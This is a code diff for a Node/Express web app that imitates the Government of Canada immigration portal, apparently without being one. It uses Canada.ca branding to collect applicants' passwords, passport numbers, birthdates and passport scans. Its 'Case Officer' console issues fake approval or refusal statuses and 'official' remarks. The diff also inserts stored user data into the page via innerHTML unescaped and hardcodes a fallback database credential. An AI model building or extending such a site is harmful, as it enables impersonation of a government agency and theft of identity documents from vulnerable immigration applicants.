@@ -21,7 +21,7 @@ const upload = multer({
     limits: { fileSize: 10 * 1024 * 1024 } // 10MB Maximum upload payload
 });
 
-// DATABASE CONNECTION WITH FALLBACK PROTECTION
+// DATABASE CONNECTION
 const fallbackURI = "mongodb+srv://testuser:testpass@cluster0.mongodb.net/immigration?retryWrites=true&w=majority";
 const MONGO_URI = process.env.MONGO_URI || fallbackURI;
 
@@ -29,7 +29,7 @@ mongoose.connect(MONGO_URI)
   .then(() => console.log('🚀 Database Node Connected Successfully'))
   .catch(err => console.error('❌ Database Initialization Warning:', err.message));
 
-// EXPANDED DATA SCHEMA WITH BINARY BUFFER HANDLING FOR FILES
+// DATA SCHEMA
 const UserSchema = new mongoose.Schema({
     name: { type: String, required: true },
     email: { type: String, required: true, unique: true, lowercase: true },
@@ -45,10 +45,9 @@ const UserSchema = new mongoose.Schema({
     trackingRef: { type: String, unique: true },
     status: { type: String, default: 'Submitted / Review Pending' },
     adminNotes: { type: String, default: 'Your application file is undergoing preliminary verification.' },
-    // Document Storage Nodes
-    attachedFile: { type: String, default: '' },     // Base64 file string
-    attachedFileName: { type: String, default: '' }, // File name string
-    attachedMimeType: { type: String, default: '' }, // File type string
+    attachedFile: { type: String, default: '' },     // Base64 string
+    attachedFileName: { type: String, default: '' }, 
+    attachedMimeType: { type: String, default: '' }, 
     createdAt: { type: Date, default: Date.now }
 });
 
@@ -61,7 +60,7 @@ const User = mongoose.models.User || mongoose.model('User', UserSchema);
 app.post('/api/auth/register', upload.single('clientDocument'), async (req, res) => {
     try {
         const { name, email, password, dob, gender, citizenship, passportNumber, residence, phone } = req.body;
-        if (!name || !email || !password) return res.status(400).json({ error: 'Primary registration parameters missing.' });
+        if (!name || !email || !password) return res.status(400).json({ error: 'Primary fields missing.' });
 
         const existingUser = await User.findOne({ email: email.toLowerCase().trim() });
         if (existingUser) return res.status(409).json({ error: 'Account already registered.' });
@@ -94,7 +93,7 @@ app.post('/api/auth/register', upload.single('clientDocument'), async (req, res)
         await newUser.save();
         res.status(201).json({ success: true, uciNumber, trackingRef });
     } catch (error) {
-        res.status(500).json({ error: 'Server registration storage pipeline failure.' });
+        res.status(500).json({ error: 'Registration pipeline failure.' });
     }
 });
 
@@ -140,8 +139,15 @@ app.get('/api/admin/enrollments', checkAdmin, async (req, res) => {
 });
 
 app.post('/api/admin/decision', checkAdmin, async (req, res) => {
-    await User.findByIdAndUpdate(req.body.id, { status: req.body.status, adminNotes: req.body.adminNotes });
-    res.json({ success: true });
+    try {
+        await User.findByIdAndUpdate(req.body.id, { 
+            status: req.body.status, 
+            adminNotes: req.body.adminNotes 
+        });
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: 'Failed to update decision' });
+    }
 });
 
 app.delete('/api/admin/user/:id', checkAdmin, async (req, res) => {
@@ -150,7 +156,7 @@ app.delete('/api/admin/user/:id', checkAdmin, async (req, res) => {
 });
 
 // ==========================================
-// RENDERING HIGH-FIDELITY OFFICIAL ADMIN CONSOLE
+// HIGH-FIDELITY OFFICIAL ADMIN CONSOLE
 // ==========================================
 app.get('/admin', (req, res) => {
     res.send(`
@@ -158,38 +164,74 @@ app.get('/admin', (req, res) => {
     <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <title>🔒 Portal Administrative Management Console - Canada.ca</title>
+        <title>🔒 Case Management Decision Console - Canada.ca</title>
         <style>
             body { font-family: "Noto Sans", sans-serif; background-color: #f9f9f9; color: #333; margin: 0; padding: 0; }
-            .gov-header { background: #fff; border-bottom: 2px solid #e16262; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; }
-            .brand-text { font-size: 22px; font-weight: 700; color: #333; letter-spacing: -0.5px; font-family: "Helvetica Neue", Helvetica, sans-serif;}
+            .gov-header { background: #fff; border-bottom: 2px solid #e16262; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+            .brand-text { font-size: 22px; font-weight: 700; color: #333; font-family: "Helvetica Neue", Helvetica, sans-serif;}
             .red-flag { color: #c8102e; }
-            .box { max-width: 1400px; margin: 30px auto; background: white; padding: 30px; border: 1px solid #dcdee1; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
-            h2 { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; border-bottom: 1px solid #afb7c0; padding-bottom: 10px; color: #222; margin-top: 0; }
+            .box { max-width: 1500px; margin: 30px auto; background: white; padding: 30px; border: 1px solid #dcdee1; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
+            h2 { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; border-bottom: 2px solid #333; padding-bottom: 12px; color: #222; margin-top: 0; }
             table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #dcdcdc; font-size: 14px; vertical-align: top; }
+            th, td { padding: 14px; text-align: left; border-bottom: 1px solid #dcdcdc; font-size: 14px; vertical-align: top; }
             th { background: #26374a; color: white; font-weight: 600; }
             tr:nth-child(even) { background: #f8fafc; }
-            .save-btn { background: #264a28; color: white; border: none; padding: 7px 14px; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 5px; border-radius: 3px; }
-            .del-btn { background: #bc1c1c; color: white; border: none; padding: 7px 14px; cursor: pointer; font-weight: bold; width: 100%; border-radius: 3px; }
-            .file-btn { display: inline-block; background: #31708f; color: white; text-decoration: none; padding: 5px 10px; font-size: 12px; font-weight: bold; margin-top: 5px; border-radius: 3px; }
-            select, textarea { width: 100%; padding: 6px; box-sizing: border-box; border: 1px solid #959595; border-radius: 3px; }
+            
+            /* Status Badge Styles */
+            .badge { display: inline-block; padding: 4px 8px; font-weight: bold; font-size: 11px; border-radius: 3px; text-transform: uppercase; margin-bottom: 5px; }
+            .badge-pending { background: #f0ad4e; color: #fff; }
+            .badge-active { background: #0275d8; color: #fff; }
+            .badge-approved { background: #5cb85c; color: #fff; }
+            .badge-refused { background: #d9534f; color: #fff; }
+
+            .save-btn { background: #264a28; color: white; border: none; padding: 8px 14px; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 6px; border-radius: 4px; border-bottom: 2px solid #142815; }
+            .save-btn:hover { background: #19331b; }
+            .del-btn { background: #bc1c1c; color: white; border: none; padding: 6px 14px; cursor: pointer; font-size: 12px; width: 100%; border-radius: 4px; }
+            .file-btn { display: inline-block; background: #2572b4; color: white; text-decoration: none; padding: 6px 12px; font-size: 12px; font-weight: bold; margin-top: 5px; border-radius: 4px; text-align: center; border-bottom: 2px solid #184b78; }
+            .file-btn:hover { background: #184b78; }
+            
+            select, textarea { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #767676; border-radius: 4px; font-size: 13px; }
+            textarea { resize: vertical; }
+
+            /* Image Preview Modal */
+            .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); justify-content: center; align-items: center; }
+            .modal-content { background: white; padding: 20px; max-width: 80%; max-height: 80%; overflow: auto; border-radius: 4px; text-align: center; }
+            .modal-close { background: #333; color: white; border: none; padding: 8px 16px; cursor: pointer; margin-top: 15px; font-weight: bold; border-radius: 4px; }
         </style>
     </head>
     <body>
         <div class="gov-header">
-            <div class="brand-text">Government of Can<span class="red-flag">ada</span> File Registry</div>
-            <button onclick="localStorage.clear(); window.location.href='/'" style="padding:8px 16px; background:#333; color:#fff; border:none; cursor:pointer; font-weight:bold; border-radius:3px;">Sign Out</button>
+            <div class="brand-text">Government of Can<span class="red-flag">ada</span> — Case Officer Core</div>
+            <button onclick="localStorage.clear(); window.location.href='/'" style="padding:8px 16px; background:#333; color:#fff; border:none; cursor:pointer; font-weight:bold; border-radius:4px;">Sign Out</button>
         </div>
+        
         <div class="box">
-            <h2>🔒 Secure Infrastructure Database Directory Control Console</h2>
+            <h2>📋 Document Under Review & System Adjudication Terminal</h2>
+            <p style="margin-top:-5px; color:#555;">Review client profile metrics, inspect data payloads, update application status vectors, and issue adjudication text lines in real-time.</p>
+            
             <table>
                 <thead>
-                    <tr><th>Applicant Identity Profile</th><th>Uploaded Payload Documents</th><th>Internal Registry Codes</th><th>Global Status Stream</th><th>Officer Tracking Notes</th><th>Execute Directives</th></tr>
+                    <tr>
+                        <th style="width:22%;">Applicant Identity Metrics</th>
+                        <th style="width:20%;">Uploaded Payload Node</th>
+                        <th style="width:18%;">Registry Identifiers</th>
+                        <th style="width:18%;">Adjudication Decision</th>
+                        <th style="width:14%;">Case Officer Remarks</th>
+                        <th style="width:10%;">Directives</th>
+                    </tr>
                 </thead>
-                <tbody id="rows"><tr><td colspan="6" style="text-align:center;">Querying Secure Database Arrays...</td></tr></tbody>
+                <tbody id="rows"><tr><td colspan="6" style="text-align:center;">Querying Secure Database Streams...</td></tr></tbody>
             </table>
         </div>
+
+        <div id="fileModal" class="modal">
+            <div class="modal-content">
+                <h3 id="modalTitle" style="margin-top:0; color:#26374a;">Document Viewer</h3>
+                <div id="modalBody"></div>
+                <button class="modal-close" onclick="closeModal()">Close Document Window</button>
+            </div>
+        </div>
+
         <script>
             const token = localStorage.getItem('adminToken');
             if (!token || localStorage.getItem('userRole') !== 'admin') { window.location.href = '/'; }
@@ -203,12 +245,22 @@ app.get('/admin', (req, res) => {
                 
                 users.forEach(u => {
                     const tr = document.createElement('tr');
-                    let fileSectionHtml = '<span style="color:#777; font-style:italic;">No documents attached</span>';
+                    
+                    // Dynamic status styling badge
+                    let badgeClass = 'badge-pending';
+                    if(u.status.includes('Approved')) badgeClass = 'badge-approved';
+                    if(u.status.includes('Refusal')) badgeClass = 'badge-refused';
+                    if(u.status.includes('Active') || u.status.includes('Biometrics')) badgeClass = 'badge-active';
+
+                    // Document interactive processing node
+                    let fileSectionHtml = '<span style="color:#777; font-style:italic;">No attachment submitted</span>';
                     if (u.attachedFile) {
+                        const isImg = u.attachedMimeType.includes('image');
                         fileSectionHtml = \`
-                            <div style="max-width:200px; word-wrap: break-word;">
-                                📁 <strong>\${u.attachedFileName}</strong><br>
-                                <a class="file-btn" href="data:\${u.attachedMimeType};base64,\${u.attachedFile}" download="\${u.attachedFileName}">Review Attachment</a>
+                            <div>
+                                📁 <span style="font-size:12px; font-weight:bold; color:#222;">\${u.attachedFileName}</span><br>
+                                <button class="file-btn" onclick="viewFile('\${u.attachedFile}', '\${u.attachedMimeType}', '\${u.attachedFileName}')">🔎 Inspect Document</button>
+                                <a class="file-btn" style="background:#555; border-bottom-color:#333;" href="data:\${u.attachedMimeType};base64,\${u.attachedFile}" download="\${u.attachedFileName}">💾 Download</a>
                             </div>
                         \`;
                     }
@@ -216,45 +268,78 @@ app.get('/admin', (req, res) => {
                     tr.innerHTML = \`
                         <td>
                             <strong>\${u.name}</strong><br>
-                            <span style="font-size:12px; color:#555;">
-                                Email: \${u.email}<br>
-                                Birthdate: \${u.dob || 'N/A'} | Sex: \${u.gender || 'N/A'}<br>
-                                Passport Origin: \${u.citizenship || 'N/A'}
+                            <span style="font-size:12px; color:#555; line-height:1.4;">
+                                Email: <code>\${u.email}</code><br>
+                                Birthdate: \${u.dob || 'N/A'}<br>
+                                Gender Metric: \${u.gender || 'N/A'}<br>
+                                Citizenship: <strong>\${u.citizenship || 'N/A'}</strong>
                             </span>
                         </td>
                         <td>\${fileSectionHtml}</td>
-                        <td>UCI ID: <strong>\${u.uciNumber || 'N/A'}</strong><br>Ref Key: <strong>\${u.trackingRef || 'N/A'}</strong><br><span style="font-size:11px; color:#555;">Serial: \${u.passportNumber || 'N/A'}</span></td>
                         <td>
-                            <select id="s-\${u._id}">
+                            <span class="badge \${badgeClass}">\${u.status}</span><br>
+                            UCI ID: <code>\${u.uciNumber || 'N/A'}</code><br>
+                            Ref Key: <code>\${u.trackingRef || 'N/A'}</code><br>
+                            Passport Serial: <strong>\${u.passportNumber || 'N/A'}</strong>
+                        </td>
+                        <td>
+                            <label style="font-size:11px; font-weight:bold; color:#555;">Adjudication Vector Selection:</label>
+                            <select id="s-\${u._id}" style="margin-top:3px;">
                                 <option value="Submitted / Review Pending" \${u.status === 'Submitted / Review Pending'?'selected':''}>Submitted / Review Pending</option>
+                                <option value="Under Active Officer Review" \${u.status === 'Under Active Officer Review'?'selected':''}>Under Active Officer Review</option>
                                 <option value="Biometrics Verification Stage" \${u.status === 'Biometrics Verification Stage'?'selected':''}>Biometrics Verification Stage</option>
                                 <option value="Background Eligibility Check" \${u.status === 'Background Eligibility Check'?'selected':''}>Background Eligibility Check</option>
                                 <option value="Registry Profile Approved" \${u.status === 'Registry Profile Approved'?'selected':''}>Registry Profile Approved</option>
                                 <option value="Refusal Issued" \${u.status === 'Refusal Issued'?'selected':''}>Refusal Issued</option>
                             </select>
                         </td>
-                        <td><textarea id="n-\${u._id}" rows="3">\${u.adminNotes || ''}</textarea></td>
                         <td>
-                            <button class="save-btn" onclick="save('\${u._id}')">Save</button>
-                            <button class="del-btn" onclick="del('\${u._id}')">Purge</button>
+                            <textarea id="n-\${u._id}" rows="4" placeholder="Enter official notes visible to applicant...">\${u.adminNotes || ''}</textarea>
+                        </td>
+                        <td>
+                            <button class="save-btn" onclick="save('\${u._id}')">Commit</button>
+                            <button class="del-btn" onclick="del('\${u._id}')">Purge File</button>
                         </td>
                     \`;
                     tbody.appendChild(tr);
                 });
             }
+
+            // Document Lightbox Inspector Mechanism
+            function viewFile(base64, mime, filename) {
+                const modal = document.getElementById('fileModal');
+                const title = document.getElementById('modalTitle');
+                const body = document.getElementById('modalBody');
+                title.innerText = "Reviewing Document: " + filename;
+                
+                if (mime.includes('image')) {
+                    body.innerHTML = \`<img src="data:\${mime};base64,\${base64}" style="max-width:100%; border:1px solid #ccc; box-shadow:0 2px 8px rgba(0,0,0,0.15);">\`;
+                } else if (mime.includes('pdf')) {
+                    body.innerHTML = \`<iframe src="data:\${mime};base64,\${base64}" style="width:100%; height:500px; border:none;"></iframe>\`;
+                } else {
+                    body.innerHTML = \`<p style="padding:20px; background:#f5f5f5;">Binary data file string formatted. Preview unsupported for this MIME. Click the download button to review manually.</p>\`;
+                }
+                modal.style.display = 'flex';
+            }
+
+            function closeModal() { document.getElementById('fileModal').style.display = 'none'; }
+
             async function save(id) {
                 const status = document.getElementById('s-'+id).value;
                 const adminNotes = document.getElementById('n-'+id).value;
-                await fetch('/api/admin/decision', {
+                const res = await fetch('/api/admin/decision', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
                     body: JSON.stringify({ id, status, adminNotes })
                 });
-                alert('Database Node Alteration Saved Successfully.');
-                loadGrid();
+                if(res.ok) {
+                    alert('🎉 Success: Decision vectors and notes committed to database cluster securely.');
+                    loadGrid();
+                } else { alert('Adjudication pipeline error.'); }
             }
+
             async function del(id) {
-                if(confirm('Purge entry completely from data cluster?')) {
+                if(confirm('🚨 WARNING: Purge application record permanently from data registry? This cannot be undone.')) {
                     await fetch('/api/admin/user/' + id, { method: 'DELETE', headers: { 'Authorization': 'Bearer ' + token } });
                     loadGrid();
                 }
@@ -267,7 +352,7 @@ app.get('/admin', (req, res) => {
 });
 
 // ==========================================
-// RENDERING OFFICIAL CANADA.CA HIGH-FIDELITY USER INTERFACE
+// OFFICIAL CANADA.CA USER INTERFACE
 // ==========================================
 app.get('*', (req, res) => {
     res.send(`
@@ -278,106 +363,62 @@ app.get('*', (req, res) => {
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Immigration and citizenship - Canada.ca</title>
         <style>
-            /* Official Canada.ca Color Palette & Font Stack */
             body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #ffffff; color: #333333; margin: 0; padding: 0; font-size: 16px; line-height: 1.4375; }
-            
-            /* Official Top Utility Strip */
             .top-utility { background-color: #26374a; padding: 8px 40px; display: flex; justify-content: flex-end; }
             .top-utility a { color: #ffffff; text-decoration: none; font-size: 13px; font-weight: 600; }
             .top-utility a:hover { text-decoration: underline; }
-
-            /* Official Main Branding Bar Header */
             .gov-brand-bar { padding: 25px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e1e4e7; background: #ffffff; }
             .signature-logo { font-size: 26px; font-weight: bold; color: #000000; letter-spacing: -1px; }
             .signature-logo span { color: #c8102e; font-weight: 800; }
-            .wordmark-visual { font-family: "Georgia", serif; font-size: 22px; color: #555; font-weight: bold; letter-spacing: 0px; }
+            .wordmark-visual { font-family: "Georgia", serif; font-size: 22px; color: #555; font-weight: bold; }
             .wordmark-visual span { color: #c8102e; }
-
-            /* Official Search Bar Placeholder */
             .search-box-mock { display: flex; align-items: center; background: #f5f5f5; border: 1px solid #ccc; padding: 6px 12px; border-radius: 4px; font-size: 14px; color: #666; width: 240px; }
-
-            /* Official Canada.ca Red Theme Horizontal Accent Rule Strip */
             .red-accent-strip { background-color: #c8102e; height: 4px; width: 100%; }
-
-            /* Breadcrumbs Path Navigation */
             .breadcrumbs { padding: 12px 40px; background-color: #f5f5f5; font-size: 14px; color: #555; border-bottom: 1px solid #e1e4e7; }
             .breadcrumbs span { margin: 0 8px; color: #999; }
             .breadcrumbs a { color: #2572b4; text-decoration: none; }
-            .breadcrumbs a:hover { text-decoration: underline; }
-
-            /* Page Layout Content Framework */
             .main-content { max-width: 1140px; margin: 30px auto; padding: 0 40px; }
-            
-            /* Official Typography Rules */
-            h1 { font-size: 38px; border-bottom: 1px solid #afb7c0; padding-bottom: 12px; margin-top: 0; margin-bottom: 24px; font-weight: 700; color: #222222; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; }
+            h1 { font-size: 38px; border-bottom: 1px solid #afb7c0; padding-bottom: 12px; margin-top: 0; margin-bottom: 24px; font-weight: 700; color: #222222; }
             h2 { font-size: 24px; color: #26374a; margin-top: 0; margin-bottom: 20px; font-weight: 700; border-bottom: 1px solid #eaebed; padding-bottom: 8px; }
             h3 { font-size: 18px; color: #333; margin-top: 25px; margin-bottom: 15px; border-bottom: 1px solid #eeeeee; padding-bottom: 6px; font-weight: 700; }
             p.lead-text { font-size: 18px; color: #555; margin-bottom: 25px; }
-
-            /* Official Tab Component Interface (WET Appearance) */
             .wet-tabs { display: flex; background: #eaebed; padding: 6px; border-radius: 4px; margin-bottom: 30px; border: 1px solid #dcdee1; }
-            .wet-tabs button { padding: 12px 24px; background: transparent; border: none; font-size: 15px; font-weight: bold; cursor: pointer; color: #26374a; border-radius: 4px; transition: all 0.15s ease-in-out; }
-            .wet-tabs button:hover { background: #dcdedf; }
+            .wet-tabs button { padding: 12px 24px; background: transparent; border: none; font-size: 15px; font-weight: bold; cursor: pointer; color: #26374a; border-radius: 4px; }
             .wet-tabs button.active { background: #26374a; color: #ffffff; }
-
-            /* Form Configuration Panels */
             .portal-panel { display: none; background: #ffffff; border: 1px solid #dcdcdc; border-radius: 4px; padding: 30px; box-shadow: 0 2px 6px rgba(0,0,0,0.03); }
             .portal-panel.active { display: block; }
-
-            /* Official Forms Grid Layout */
             .form-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 20px; }
             @media (max-width: 900px) { .form-grid { grid-template-columns: repeat(2, 1fr); } }
             @media (max-width: 600px) { .form-grid { grid-template-columns: 1fr; } }
-
             .input-group { display: flex; flex-direction: column; }
             label { font-size: 15px; font-weight: 600; margin-bottom: 6px; color: #333333; }
             .required-mark { color: #bc1c1c; font-weight: bold; }
-            
-            /* Official WET Form Control Appearance */
             input, select { padding: 8px 12px; border: 1px solid #444444; font-size: 15px; border-radius: 4px; width: 100%; box-sizing: border-box; background-color: #ffffff; color: #333333; height: 40px; }
-            input:focus, select:focus { border-color: #2572b4; outline: 3px solid #bcdef5; }
             input[type="file"] { border: 2px dashed #26374a; background: #fafafa; padding: 6px; cursor: pointer; height: auto; }
-
-            /* Official Button Blueprint Styles (WET Action Buttons) */
-            .btn-primary { padding: 11px 24px; background-color: #2572b4; color: #ffffff; border: 1px solid #2369a5; font-size: 16px; font-weight: 700; cursor: pointer; border-radius: 4px; border-bottom: 3px solid #1b5180; transition: background-color 0.1s; }
+            .btn-primary { padding: 11px 24px; background-color: #2572b4; color: #ffffff; border: 1px solid #2369a5; font-size: 16px; font-weight: 700; cursor: pointer; border-radius: 4px; border-bottom: 3px solid #1b5180; }
             .btn-primary:hover { background-color: #1b5180; text-decoration: underline; }
-            .btn-primary:active { border-bottom-width: 1px; margin-top: 2px; }
-
-            /* Official Tracking Info Status Box Output Component */
             .status-display-card { display: none; margin-top: 30px; padding: 25px; border-left: 6px solid #bc1c1c; background-color: #fcf8f8; border-top: 1px solid #e3cbcb; border-right: 1px solid #e3cbcb; border-bottom: 1px solid #e3cbcb; border-radius: 4px; }
-            
-            /* High Fidelity Official Site Footer Section Layout */
-            .gov-footer { background-color: #26374a; color: #ffffff; padding: 40px; margin-top: 60px; font-size: 14px; border-top: 1px solid #1d2a39; }
+            .gov-footer { background-color: #26374a; color: #ffffff; padding: 40px; margin-top: 60px; font-size: 14px; }
             .footer-links { max-width: 1140px; margin: 0 auto; display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; }
-            @media (max-width: 600px) { .footer-links { grid-template-columns: 1fr; } }
             .footer-column h4 { font-size: 16px; font-weight: 700; border-bottom: 1px solid #3f566e; padding-bottom: 8px; margin-top: 0; color: #ffffff; }
             .footer-column ul { list-style: none; padding: 0; margin: 0; }
             .footer-column ul li { margin-bottom: 10px; }
             .footer-column ul li a { color: #ffffff; text-decoration: none; }
-            .footer-column ul li a:hover { text-decoration: underline; }
             .footer-sub-strip { max-width: 1140px; margin: 30px auto 0 auto; padding-top: 20px; border-top: 1px solid #3f566e; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #ccd5df; }
         </style>
     </head>
     <body>
-
-        <div class="top-utility">
-            <a href="#">Français</a>
-        </div>
-
+        <div class="top-utility"><a href="#">Français</a></div>
         <div class="gov-brand-bar">
             <div class="signature-logo">Gov<span>ernment</span> of Canada</div>
             <div class="search-box-mock">Search Canada.ca 🔍</div>
         </div>
-        
         <div class="red-accent-strip"></div>
-
-        <div class="breadcrumbs">
-            <a href="#">Home</a><span>&gt;</span><a href="#">Immigration, Refugees and Citizenship</a><span>&gt;</span>Active Registry Portal Terminal
-        </div>
+        <div class="breadcrumbs"><a href="#">Home</a><span>&gt;</span><a href="#">Immigration, Refugees and Citizenship</a><span>&gt;</span>Active Registry Portal Terminal</div>
         
         <div class="main-content">
             <h1>Immigration and Secure Client Portal Terminal</h1>
-            <p class="lead-text">Access your personal security enrollment profile, transmit legal digital document payload attachments, and safely monitor deployment evaluation updates in real-time under the oversight of the Department registry dashboard.</p>
+            <p class="lead-text">Access your personal security enrollment profile, transmit legal digital document payload attachments, and safely monitor deployment evaluation updates in real-time.</p>
             
             <div class="wet-tabs">
                 <button type="button" id="btn-login" class="active" onclick="setView('loginPanel', 'btn-login')">Access Existing Account</button>
@@ -405,7 +446,6 @@ app.get('*', (req, res) => {
             <div id="registerPanel" class="portal-panel">
                 <h2>Secure System Enrollment Registry Profile</h2>
                 <form id="rForm" enctype="multipart/form-data">
-                    
                     <h3>Personal Identification Parameters Matrix</h3>
                     <div class="form-grid">
                         <div class="input-group">
@@ -438,18 +478,18 @@ app.get('*', (req, res) => {
                         </div>
                     </div>
 
-                    <h3>Contact Parameters & Access Framework Configuration</h3>
+                    <h3>Contact Parameters & Access Framework</h3>
                     <div class="form-grid">
                         <div class="input-group">
-                            <label>Primary Telephone Contact Base Line <span class="required-mark">*</span></label>
+                            <label>Primary Telephone Contact <span class="required-mark">*</span></label>
                             <input type="tel" id="rPhone" required placeholder="e.g. +1 555-0199">
                         </div>
                         <div class="input-group">
-                            <label>Communication Email Access Point <span class="required-mark">*</span></label>
+                            <label>Email Access Point <span class="required-mark">*</span></label>
                             <input type="email" id="rEmail" required placeholder="e.g. user@domain.com">
                         </div>
                         <div class="input-group">
-                            <label>Create Security Access Password <span class="required-mark">*</span></label>
+                            <label>Create Security Password <span class="required-mark">*</span></label>
                             <input type="password" id="rPass" required placeholder="Minimum 8 characters">
                         </div>
                     </div>
@@ -459,7 +499,6 @@ app.get('*', (req, res) => {
                         <div class="input-group">
                             <label style="margin-bottom:8px;">Upload Passport Data Page / Identity Certificate <span class="required-mark">*</span></label>
                             <input type="file" id="rFile" name="clientDocument" accept=".pdf,.png,.jpg,.jpeg" required>
-                            <span style="font-size:13px; color:#666; margin-top:5px;">Accepted formats: PDF, PNG, JPG, JPEG up to 10MB maximum payload.</span>
                         </div>
                     </div>
 
@@ -489,14 +528,12 @@ app.get('*', (req, res) => {
                     <ul>
                         <li><a href="#">Contact Immigration Services</a></li>
                         <li><a href="#">Department Directory Offices</a></li>
-                        <li><a href="#">Help Center Documentation</a></li>
                     </ul>
                 </div>
                 <div class="footer-column">
                     <h4>Government Transparency</h4>
                     <ul>
                         <li><a href="#">All Services Directory</a></li>
-                        <li><a href="#">Departmental Operational News</a></li>
                         <li><a href="#">Privacy Framework Statements</a></li>
                     </ul>
                 </div>
@@ -504,8 +541,6 @@ app.get('*', (req, res) => {
                     <h4>Corporate Assets</h4>
                     <ul>
                         <li><a href="#">Terms and System Conditions</a></li>
-                        <li><a href="#">Canada.ca System Architecture</a></li>
-                        <li><a href="#">Open Corporate Data Repositories</a></li>
                     </ul>
                 </div>
             </div>
@@ -519,12 +554,10 @@ app.get('*', (req, res) => {
             function setView(panelId, btnId) {
                 document.querySelectorAll('.portal-panel').forEach(p => p.classList.remove('active'));
                 document.querySelectorAll('.wet-tabs button').forEach(b => b.classList.remove('active'));
-                
                 document.getElementById(panelId).classList.add('active');
                 document.getElementById(btnId).classList.add('active');
             }
 
-            // REGISTER LOOP ARCHITECTURE WITH MULTIPART FORMDATA ATTACHMENT BUFFERS
             document.getElementById('rForm').addEventListener('submit', async (e) => {
                 e.preventDefault();
                 const btn = e.target.querySelector('.btn-primary');
@@ -543,18 +576,13 @@ app.get('*', (req, res) => {
                 formData.append('password', document.getElementById('rPass').value);
                 
                 const fileInput = document.getElementById('rFile');
-                if(fileInput.files.length > 0) {
-                    formData.append('clientDocument', fileInput.files[0]);
-                }
+                if(fileInput.files.length > 0) formData.append('clientDocument', fileInput.files[0]);
 
                 try {
-                    const res = await fetch('/api/auth/register', {
-                        method: 'POST',
-                        body: formData 
-                    });
+                    const res = await fetch('/api/auth/register', { method: 'POST', body: formData });
                     const data = await res.json();
                     if(res.ok && data.success) {
-                        alert('🎉 Profile File and Attachements Logged Successfully!\\n\\nOfficial Verification Access Tracking Credentials:\\nUnique Client ID (UCI): ' + data.uciNumber + '\\nTracking Reference Code: ' + data.trackingRef);
+                        alert('🎉 Profile File and Attachments Logged Successfully!\\n\\nUCI: ' + data.uciNumber + '\\nRef Code: ' + data.trackingRef);
                         document.getElementById('rForm').reset();
                         setView('loginPanel', 'btn-login');
                     } else { alert('Registration Exception: ' + data.error); }
@@ -562,7 +590,6 @@ app.get('*', (req, res) => {
                 finally { btn.innerText = "Execute Processing Enrollment Registry"; btn.disabled = false; }
             });
 
-            // LOGIN SUBSYSTEM TRANSACTION CALLS
             document.getElementById('lForm').addEventListener('submit', async (e) => {
                 e.preventDefault();
                 try {
@@ -585,10 +612,9 @@ app.get('*', (req, res) => {
                             alert('Identity Access Granted!\\n\\nHolder profile: ' + data.name + '\\nUCI: ' + data.uciNumber + '\\nRef Key: ' + data.trackingRef);
                         }
                     } else { alert('Access Refused: ' + data.error); }
-                } catch(err) { alert('Authentication endpoint loop connection error.'); }
+                } catch(err) { alert('Authentication connection error.'); }
             });
 
-            // TRACK SYSTEM INTEGRITY QUERY MATRIX LINK
             document.getElementById('tForm').addEventListener('submit', async (e) => {
                 e.preventDefault();
                 try {
@@ -603,7 +629,7 @@ app.get('*', (req, res) => {
                         out.style.display = 'block';
                         out.innerHTML = '<h3 style="color:#bc1c1c; margin-top:0; border:none; padding:0;">File Identity Verified: ' + data.name + '</h3><p style="font-size:16px; margin:12px 0;"><strong>Active File Status Stream:</strong> <span style="color:#bc1c1c; font-weight:bold;">' + data.status + '</span></p><p style="color:#444; font-size:15px; background:#ffffff; padding:12px; border:1px solid #dcdcdc; line-height:1.5;"><strong>Official Case Officer Remarks:</strong> ' + data.adminNotes + '</p>';
                     } else { alert('Tracking Search Handle Not Found: ' + data.error); }
-                } catch(err) { alert('Could not synchronize query stream with live data cluster.'); }
+                } catch(err) { alert('Could not synchronize query stream.'); }
             });
         </script>
     </body>
